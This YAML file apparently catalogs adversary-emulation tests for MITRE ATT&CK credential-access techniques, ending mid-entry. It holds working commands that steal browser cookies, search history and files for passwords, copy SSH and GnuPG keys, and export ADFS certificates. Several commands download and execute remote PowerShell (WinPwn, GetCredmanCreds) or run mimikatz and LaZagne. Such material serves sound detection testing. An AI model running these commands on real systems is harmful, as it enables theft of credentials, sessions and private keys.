    There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.[6](https://github.com/kgretzky/evilginx2)[7](https://github.com/muraenateam/muraena)

    After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.
  tactic: credential-access
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Steal Firefox Cookies (Windows)
      type: powershell
      platform: windows
      command: |-
        stop-process -name "firefox" -force -erroraction silentlycontinue
        $CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
        "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe "$CookieDBLocation" | out-file -filepath "PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt"
      cleanup: remove-item PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt -erroraction silentlycontinue
      timeout: 120
      is_safe: true
    - name: Steal Chrome Cookies (Windows)
      type: powershell
      platform: windows
      command: |-
        stop-process -name "chrome" -force -erroraction silentlycontinue
        "select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe "$env:localappdata\Google\Chrome\User Data\Default\Network\Cookies" | out-file -filepath "PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt"
      cleanup: remove-item PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt
      timeout: 120
      is_safe: true
    - name: Steal Chrome Cookies via Remote Debugging (Mac)
      type: bash
      platform: macos
      command: |-
        killall 'Google Chrome'
        sleep 1
        open -a "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/
        sleep 1
        /tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337
      cleanup: rm -rf /tmp/WhiteChocolateMacademiaNut
      timeout: 60
      is_safe: false
    - name: Steal Chrome v127+ cookies via Remote Debugging (Windows)
      type: powershell
      platform: windows
      command: |-
        $devToolsPort = 9222
        $testUrl = "https://www.google.com"
        stop-process -name "chrome" -force -erroraction silentlycontinue
        $chromeProcess = Start-Process "chrome.exe" "$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default" -PassThru
        Start-Sleep 10
        $jsonResponse = Invoke-WebRequest "http://localhost:$devToolsPort/json" -UseBasicParsing
        $devToolsPages = ConvertFrom-Json $jsonResponse.Content
        $ws_url = $devToolsPages[0].webSocketDebuggerUrl
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $uri = New-Object System.Uri($ws_url)
        $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
        $GET_ALL_COOKIES_REQUEST = '{"id": 1, "method": "Network.getAllCookies"}'
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
        $segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
        $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
        $completeMessage = New-Object System.Text.StringBuilder
        do {
            $receivedBuffer = New-Object byte[] 2048
            $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length
            $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result
            $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)
            $completeMessage.Append($receivedString)
        } while (-not $result.EndOfMessage)
        $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [System.Threading.CancellationToken]::None).Wait()
        try {
            $response = ConvertFrom-Json $completeMessage.ToString()
            $cookies = $response.result.cookies
        } catch {
            Write-Host "Error parsing JSON data."
        }
        Write-Host $cookies
        Stop-Process $chromeProcess -Force
      timeout: 120
      is_safe: true
    - name: Copy Safari BinaryCookies files using AppleScript
      type: sh
      platform: macos
      command: osascript -e 'tell application "Finder"' -e 'set destinationFolderPath to POSIX file "/private/tmp"' -e 'set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")' -e 'duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'
      cleanup: rm "/private/tmp/Cookies.binarycookies"
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1539
  is_safe: true
- id: T1552
  name: Unsecured Credentials
  description: Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Shell History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)),  or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).[1](https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf)
  tactic: credential-access
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: AWS - Retrieve EC2 Password Data using stratus
      type: sh
      platform: linux
      command: "export AWS_REGION=us-west-2 \ncd $PathToAtomicsFolder/T1552/src\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force"
      cleanup: |-
        export AWS_REGION=us-west-2
        echo "Cleanup detonation"
        cd $PathToAtomicsFolder/T1552/src
        ./stratus cleanup --all
        rm -rf stratus*
      timeout: 60
      is_safe: false
    - name: AWS - Retrieve EC2 Password Data using stratus
      type: sh
      platform: macos
      command: "export AWS_REGION=us-west-2 \ncd $PathToAtomicsFolder/T1552/src\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force"
      cleanup: |-
        export AWS_REGION=us-west-2
        echo "Cleanup detonation"
        cd $PathToAtomicsFolder/T1552/src
        ./stratus cleanup --all
        rm -rf stratus*
      timeout: 60
      is_safe: false
    - name: Search for Passwords in Powershell History
      type: powershell
      platform: windows
      command: ls -R C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String "password", "-p", "key", "pwd", "pass"
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1552
  is_safe: false
- id: T1552.001
  name: Credentials In Files
  description: |-
    Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

    It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).[1](http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.[2](http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx)

    In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.[3](https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/) They may also be found as parameters to deployment commands in container logs.[4](https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.[5](https://posts.specterops.io/head-in-the-clouds-bd038bb69e48)
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Find AWS credentials
      type: sh
      platform: macos
      command: find //.aws -name "credentials" -type f 2>/dev/null
      timeout: 60
      is_safe: true
    - name: Find AWS credentials
      type: sh
      platform: linux
      command: find //.aws -name "credentials" -type f 2>/dev/null
      timeout: 60
      is_safe: true
    - name: Extract Browser and System credentials with LaZagne
      type: bash
      platform: macos
      command: python2 laZagne.py all
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Extract passwords with grep
      type: sh
      platform: linux
      command: |-
        grep -ri password /
        exit 0
      timeout: 60
      is_safe: true
    - name: Extract passwords with grep
      type: sh
      platform: macos
      command: |-
        grep -ri password /
        exit 0
      timeout: 60
      is_safe: true
    - name: Extracting passwords with findstr
      type: powershell
      platform: windows
      command: |-
        findstr /si pass *.xml *.doc *.txt *.xls
        ls -R | select-string -ErrorAction SilentlyContinue -Pattern password
      timeout: 120
      is_safe: true
    - name: Access unattend.xml
      type: cmd
      platform: windows
      command: |-
        type C:\Windows\Panther\unattend.xml
        type C:\Windows\Panther\Unattend\unattend.xml
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Find and Access Github Credentials
      type: bash
      platform: linux
      command: for file in $(find /home -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
      timeout: 60
      is_safe: true
    - name: Find and Access Github Credentials
      type: bash
      platform: macos
      command: for file in $(find /home -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
      timeout: 60
      is_safe: true
    - name: WinPwn - sensitivefiles
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        sensitivefiles -noninteractive -consoleoutput
      timeout: 120
      is_safe: true
    - name: WinPwn - Snaffler
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        Snaffler -noninteractive -consoleoutput
      timeout: 120
      is_safe: true
    - name: WinPwn - powershellsensitive
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        powershellsensitive -consoleoutput -noninteractive
      timeout: 120
      is_safe: true
    - name: WinPwn - passhunt
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        passhunt -local $true -noninteractive
      cleanup: |-
        rm -force .\passhunt.exe -ErrorAction Ignore
        rm -force .\phunter* -ErrorAction Ignore
        rm -force -recurse .\DomainRecon -ErrorAction Ignore
        rm -force -recurse .\Exploitation -ErrorAction Ignore
        rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
        rm -force -recurse .\LocalRecon -ErrorAction Ignore
        rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
      timeout: 120
      is_safe: false
    - name: WinPwn - SessionGopher
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        sessionGopher -noninteractive -consoleoutput
      timeout: 120
      is_safe: true
    - name: WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        SharpCloud -consoleoutput -noninteractive
      timeout: 120
      is_safe: true
    - name: List Credential Files via PowerShell
      type: powershell
      platform: windows
      command: |-
        $usernameinfo = (Get-ChildItem Env:USERNAME).Value
        Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\
        Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Local\Microsoft\Credentials\
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: List Credential Files via Command Prompt
      type: cmd
      platform: windows
      command: |-
        dir /a:h C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\
        dir /a:h C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Find Azure credentials
      type: sh
      platform: macos
      command: find //.azure -name "msal_token_cache.json" -o -name "accessTokens.json" -type f 2>/dev/null
      timeout: 60
      is_safe: true
    - name: Find Azure credentials
      type: sh
      platform: linux
      command: find //.azure -name "msal_token_cache.json" -o -name "accessTokens.json" -type f 2>/dev/null
      timeout: 60
      is_safe: true
    - name: Find GCP credentials
      type: sh
      platform: macos
      command: find //.config/gcloud -name "credentials.db" -o -name "access_tokens.db" -type f 2>/dev/null
      timeout: 60
      is_safe: true
    - name: Find GCP credentials
      type: sh
      platform: linux
      command: find //.config/gcloud -name "credentials.db" -o -name "access_tokens.db" -type f 2>/dev/null
      timeout: 60
      is_safe: true
    - name: Find OCI credentials
      type: sh
      platform: macos
      command: find //.oci/sessions -name "token" -type f 2>/dev/null
      timeout: 60
      is_safe: true
    - name: Find OCI credentials
      type: sh
      platform: linux
      command: find //.oci/sessions -name "token" -type f 2>/dev/null
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1552/001
  is_safe: true
- id: T1552.002
  name: Credentials in Registry
  description: |-
    Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

    Example commands to find Registry keys related to password information: [1](https://pentestlab.blog/2017/04/19/stored-credentials/)

    * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
    * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Enumeration for Credentials in Registry
      type: cmd
      platform: windows
      command: |-
        reg query HKLM /f password /t REG_SZ /s
        reg query HKCU /f password /t REG_SZ /s
      timeout: 120
      is_safe: true
    - name: Enumeration for PuTTY Credentials in Registry
      type: cmd
      platform: windows
      command: reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1552/002
  is_safe: true
- id: T1552.003
  name: Shell History
  description: |-
    Adversaries may search the command history on compromised systems for insecurely stored credentials.

    On Linux and macOS systems, shells such as Bash and Zsh keep track of the commands users type on the command-line with the "history" utility. Once a user logs out, the history is flushed to the user's history file. For each user, this file resides at the same location: for example, `~/.bash_history` or `~/.zsh_history`. Typically, these files keeps track of the user's last 1000 commands.

    On Windows, PowerShell has both a command history that is wiped after the session ends, and one that contains commands used in all sessions and is persistent. The default location for persistent history can be found in `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`, but command history can also be accessed with `Get-History`. Command Prompt (CMD) on Windows does not have persistent history.[1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_history?view=powershell-7.5)[2](https://michaelkoczwara.medium.com/windows-privilege-escalation-dbb908cce8d4)

    Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials.[3](https://www.slideshare.net/slideshow/external-to-da-the-os-x-way/62021418)
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Search Through Bash History
      type: sh
      platform: linux
      command: cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
      timeout: 60
      is_safe: true
    - name: Search Through Bash History
      type: sh
      platform: macos
      command: cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
      timeout: 60
      is_safe: true
    - name: Search Through sh History
      type: sh
      platform: linux
      command: cat ~/.history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1552/003
  is_safe: true
- id: T1552.004
  name: Private Keys
  description: "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.[1](https://en.wikipedia.org/wiki/Public-key_cryptography) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.[2](https://web.archive.org/web/20141031134104/http://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf)[3](https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/)\n\nWhen a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device’s identity.[4](https://learn.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token) An adversary with access to the device may be able to export the keys in order to impersonate the device.[5](https://aadinternals.com/post/deviceidentity/)\n\nOn network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.[6](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/sec_conn_pki/configuration/xe-17/sec-pki-xe-17-book/sec-deploy-rsa-pki.html#GUID-1CB802D8-9DE3-447F-BECE-CF22F5E11436) \n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email."
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Private Keys
      type: cmd
      platform: windows
      command: dir c:\ /b /s .key | findstr /e .key
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Discover Private SSH Keys
      type: sh
      platform: linux
      command: |-
        find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt
        exit 0
      cleanup: rm /tmp/keyfile_locations.txt
      timeout: 60
      is_safe: true
    - name: Discover Private SSH Keys
      type: sh
      platform: macos
      command: |-
        find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt
        exit 0
      cleanup: rm /tmp/keyfile_locations.txt
      timeout: 60
      is_safe: true
    - name: Copy Private SSH Keys with CP
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/art-staging
        find / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \;
        exit 0
      cleanup: rm -rf /tmp/art-staging
      timeout: 60
      is_safe: false
    - name: Copy Private SSH Keys with CP (freebsd)
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/art-staging
        find / -name id_rsa 2>/dev/null -exec gcp --parents {} /tmp/art-staging \;
      cleanup: rm -rf /tmp/art-staging
      timeout: 60
      is_safe: false
    - name: Copy Private SSH Keys with rsync
      type: sh
      platform: macos
      command: |-
        mkdir /tmp/art-staging
        find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \;
        exit 0
      cleanup: rm -rf /tmp/art-staging
      timeout: 60
      is_safe: false
    - name: Copy Private SSH Keys with rsync
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/art-staging
        find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \;
        exit 0
      cleanup: rm -rf /tmp/art-staging
      timeout: 60
      is_safe: false
    - name: Copy Private SSH Keys with rsync (freebsd)
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/art-staging
        find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \;
      cleanup: rm -rf /tmp/art-staging
      timeout: 60
      is_safe: false
    - name: Copy the users GnuPG directory with rsync
      type: sh
      platform: macos
      command: |-
        mkdir /tmp/GnuPG
        find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \;
        exit 0
      cleanup: rm -rf /tmp/GnuPG
      timeout: 60
      is_safe: false
    - name: Copy the users GnuPG directory with rsync
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/GnuPG
        find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \;
        exit 0
      cleanup: rm -rf /tmp/GnuPG
      timeout: 60
      is_safe: false
    - name: Copy the users GnuPG directory with rsync (freebsd)
      type: sh
      platform: linux
      command: |-
        mkdir /tmp/GnuPG
        find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \;
      cleanup: rm -rf /tmp/GnuPG
      timeout: 60
      is_safe: false
    - name: ADFS token signing and encryption certificates theft - Local
      type: powershell
      platform: windows
      command: |-
        Import-Module AADInternals -Force
        Export-AADIntADFSCertificates
        Get-ChildItem | Where-Object {$_ -like "ADFS*"}
        Write-Host "`nCertificates retrieved successfully"
      cleanup: |-
        Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
        Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: ADFS token signing and encryption certificates theft - Remote
      type: powershell
      platform: windows
      command: "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\""
      cleanup: |-
        Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
        Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: CertUtil ExportPFX
      type: powershell
      platform: windows
      command: "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\atomic.pfx"
      cleanup: Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Export Root Certificate with Export-PFXCertificate
      type: powershell
      platform: windows
      command: |-
        $mypwd = ConvertTo-SecureString -String "AtomicRedTeam" -Force -AsPlainText
        $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
        Set-Location Cert:\LocalMachine\My
        Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $env:Temp\atomicredteam.pfx -Password $mypwd
      cleanup: |-
        try {
        $cert = Import-Certificate -FilePath $env:Temp\atomicredteam.pfx -CertStoreLocation Cert:\LocalMachine\My
        Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
        Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
        } catch { }
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Export Root Certificate with Export-Certificate
      type: powershell
      platform: windows
      command: |-
        $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
        Set-Location Cert:\LocalMachine\My
        Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath $env:Temp\AtomicRedTeam.cer
      cleanup: |-
        try {
           $cert = Import-Certificate -FilePath $env:Temp\AtomicRedTeam.cer -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
           Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
           Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
        }
        catch { }
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Export Certificates with Mimikatz
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe" "crypto::certificates /systemstore:local_machine /store:my /export"  exit'
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1552/004
  is_safe: true
- id: T1552.006
  name: Group Policy Preferences
  description: |-
    Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.[1](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v%3Dws.11))

    These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).[2](https://msdn.microsoft.com/library/cc422924.aspx)

    The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

    * Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>
    * Get-GPPPassword[3](https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html)
    * gpprefdecrypt.py

    On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: GPP Passwords (findstr)
      type: cmd
      platform: windows
      command: findstr /S cpassword %logonserver%\sysvol\*.xml
      timeout: 120
      is_safe: true
    - name: GPP Passwords (Get-GPPPassword)
      type: powershell
      platform: windows
      command: |-
        . "PathToAtomicsFolder\..\ExternalPayloads\Get-GPPPassword.ps1"
        Get-GPPPassword -Verbose
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1552/006
  is_safe: true
- id: T1555
  name: Credentials from Password Stores
  description: Adversaries may search for common password storage locations to obtain user credentials.[1](https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf) Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Extract Windows Credential Manager via VBA
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
      cleanup: Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]
      type: powershell
      platform: windows
      command: IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force
      timeout: 120
      is_safe: true
    - name: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]
      type: powershell
      platform: windows
      command: IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force
      timeout: 120
      is_safe: true
    - name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]
      type: powershell
      platform: windows
      command: vaultcmd /listcreds:"Windows Credentials" /all
      timeout: 120
      is_safe: true
    - name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]
      type: powershell
      platform: windows
      command: vaultcmd /listcreds:"Web Credentials" /all
      timeout: 120
      is_safe: true
    - name: WinPwn - Loot local Credentials - lazagne
      type: powershell
      platform: windows
      command: |-
